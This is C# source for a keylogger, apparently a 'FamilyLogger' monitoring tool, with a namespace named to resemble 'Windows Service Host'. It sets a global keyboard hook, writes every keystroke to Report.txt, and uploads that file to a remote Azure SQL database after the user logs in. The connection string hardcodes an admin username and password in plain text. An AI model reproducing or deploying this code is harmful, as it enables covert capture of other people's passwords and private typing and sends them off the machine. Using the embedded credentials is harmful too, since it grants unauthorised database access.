using System;
using System.Windows.Forms;
using Keystroke.API;
using System.IO;
using System.Data.SqlClient;
using System.Data;

namespace Windows_Service_Host
{
    class Keylogger
    {

        // createFile creates an empty text file in the program directory.
        // side effects: creates a text file.
        public static void createFile()
        {
            using (FileStream fs = File.Create("Report.txt"))
            {
            }
        }

        // addFileToDatabase(email) uploads the context of the textfile to the database row corresponding to the logged-in user.
        // side effects: reads from a file, writes to a database
        public static void addFileToDatabase(string email)
        {
            using (SqlConnection con = new SqlConnection(@"Server=tcp:familylogger.database.windows.net,1433;Initial Catalog=FamilyLogger;Persist Security Info=False;User ID=floggeradmin;Password=Ambergris9;MultipleActiveResultSets=False;Encrypt=True;TrustServerCertificate=False;Connection Timeout=30;"))
            {
                con.Open();
                byte[] report = File.ReadAllBytes("Report.txt");
                SqlCommand sendReport = new SqlCommand("UPDATE users SET report = @report WHERE email = @email", con);
                SqlParameter reportParam = sendReport.Parameters.AddWithValue("report", report);
                SqlParameter emailParam = sendReport.Parameters.AddWithValue("email", email);
                reportParam.DbType = DbType.Binary;
                sendReport.ExecuteNonQuery();
            }
        }

        // Login() logs the user in and returns the user's email address if they can be found. If not, it returns null.
        // side effects: queries database, mutates variables
        public static string Login()
        {
            using (SqlConnection con = new SqlConnection(@"Server=tcp:familylogger.database.windows.net,1433;Initial Catalog=FamilyLogger;Persist Security Info=False;User ID=floggeradmin;Password=Ambergris9;MultipleActiveResultSets=False;Encrypt=True;TrustServerCertificate=False;Connection Timeout=30;"))
            {
                con.Open();
                SqlCommand getUserData = new SqlCommand("SELECT * FROM users WHERE email = @email AND password = @password", con);
                Console.Write("Email Address: ");
                string emailInput = Console.ReadLine();
                string email = null;
                Console.WriteLine();
                Console.Write("Password: ");
                string passwordInput = Console.ReadLine();
                getUserData.Parameters.AddWithValue("email", emailInput);
                getUserData.Parameters.AddWithValue("password", passwordInput);
                SqlDataReader reader = getUserData.ExecuteReader();
                while (reader.Read())
                {
                    email = reader["email"].ToString();
                }
                return email;
            }
        }

        // The main method outputs any keystrokes typed to both the console and a text file while the program is opened. It also syncs the text file to an Azure
        //     database.
        // side effects: console output, writing to file, reading from and writing to a database, variable mutation
        static void Main(string[] args)
        {
            string userEmail = null;
            do
            {
                userEmail = Login();
                if (String.IsNullOrEmpty(userEmail))
                {
                    Console.WriteLine("Email or password is incorrect. Please try again.");
                }
                else
                {
                    Console.WriteLine("Login successful!");
                }
            }
            while (String.IsNullOrEmpty(userEmail));
            addFileToDatabase(userEmail);

            using (var api = new KeystrokeAPI())
            {
                if (!File.Exists("Report.txt"))
                {
                    createFile();
                }
                StreamWriter report = new StreamWriter("Report.txt", append: true);
                report.AutoFlush = true;
                using (report)
                {
                    api.CreateKeyboardHook((character) =>
                    {
                        Console.Write(character);
                        report.Write(character);
                    });

                Application.Run();
                }
            }
        }

    }
}
